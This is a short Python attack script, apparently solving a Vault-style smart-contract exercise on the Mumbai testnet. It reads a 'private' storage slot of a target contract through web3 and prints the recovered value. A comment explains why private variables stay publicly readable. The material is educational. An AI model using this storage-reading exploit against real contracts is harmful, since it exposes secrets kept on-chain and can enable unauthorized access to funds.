
from web3 import Web3
import os
import json

# https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925

class VaultAttack():
    def __init__(self):

        # read sensitive data from file
        curr_path = os.path.dirname(os.path.abspath(__file__)) + '/'
        try:
            with open(curr_path + '../secret.json') as json_file:
                self.secret_json = json.load(json_file)
        except:
            print('secret.json missing')
            exit()

        # init web3
        alchemy_url = "https://polygon-mumbai.g.alchemy.com/v2/" + self.secret_json['alpchemy']['api_key']
        self.w3 = Web3(Web3.HTTPProvider(alchemy_url))
        
        index = 1
        contract_2_attact = self.secret_json['contract_to_attack']
        contract_storage_data = self.w3.eth.getStorageAt(contract_2_attact, index)

        print(self.w3.toText(contract_storage_data))
        print(self.w3.toBytes(contract_storage_data))
        print(self.w3.toHex(contract_storage_data))
        
        '''
        It's important to remember that marking a variable as private only prevents other contracts from accessing it. 
        State variables marked as private and local variables are still publicly accessible.

        To ensure that data is private, it needs to be encrypted before being put onto the blockchain. 
        In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. 
        zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.
        '''

if __name__ == '__main__':
    va = VaultAttack()